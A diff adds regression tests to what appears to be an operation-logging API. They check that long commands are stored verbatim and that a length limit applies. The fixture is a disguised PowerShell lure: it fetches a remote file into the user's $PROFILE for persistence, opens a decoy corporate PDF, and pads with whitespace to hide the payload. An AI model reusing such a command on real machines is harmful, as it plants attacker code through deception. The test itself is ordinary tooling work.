@@ -608,6 +608,33 @@ describe('injection hardening', () => {
 
 // ── 7. Assorted regressions ──────────────────────────────────────────────────
 
+describe('command fidelity', () => {
+  // Regression: a 592-character operator command was rejected (254 limit)
+  // and ">>" was stored as "&gt;&gt;".
+  const operatorCmd = 'Powershell.exe -c "C:\\Windows\\System32\\curl -kL https://raw.githubusercontent.com/GreenCow1989/logseq/refs/heads/master/.lsp/readme.md >> $PROFILE"; '
+    + 'Start-Process https://corporate.target.com/getmedia/d4d58f98-7b1c-4441-85ba-84512a865228/TGT-Target-Announces-Voting-Results-from-2026-Annual-Meeting-of-Shareholders.pdf  #'
+    + ' '.repeat(178) + '\\\\corporate.target.com\\2026\\documents\\Voting Results from 2026 Annual Meeting of Shareholders.pdf';
+
+  test('a long command with quotes, backslashes and >> round-trips verbatim', async () => {
+    assert.ok(operatorCmd.length > 254, `fixture is ${operatorCmd.length} chars`);
+    const res = await user.request('PUT', `/api/logs/${fx.userLog.id}`, { command: operatorCmd });
+    assert.equal(res.status, 200, res.text);
+    const check = await user.request('GET', `/api/logs/${fx.userLog.id}`);
+    assert.equal(check.json.command, operatorCmd);
+  });
+
+  test('a 32768-character command is accepted and 32769 is rejected with the reason', async () => {
+    const max = 'powershell -enc ' + crypto.randomBytes(24576).toString('base64').slice(0, 32768 - 16);
+    const ok = await user.request('PUT', `/api/logs/${fx.userLog.id}`, { command: max });
+    assert.equal(ok.status, 200, ok.text);
+    assert.equal(ok.json.command.length, 32768);
+
+    const tooLong = await user.request('PUT', `/api/logs/${fx.userLog.id}`, { command: max + 'x' });
+    assert.equal(tooLong.status, 400);
+    assert.match(JSON.stringify(tooLong.json.details), /command must not exceed 32768 characters/);
+  });
+});
+
 describe('assorted regressions', () => {
   test('GET /api/logs/s3-config responds (regression: shadowed by /:id)', async () => {
     // 200 when configured; a clean 404 when not. The regression was a 500
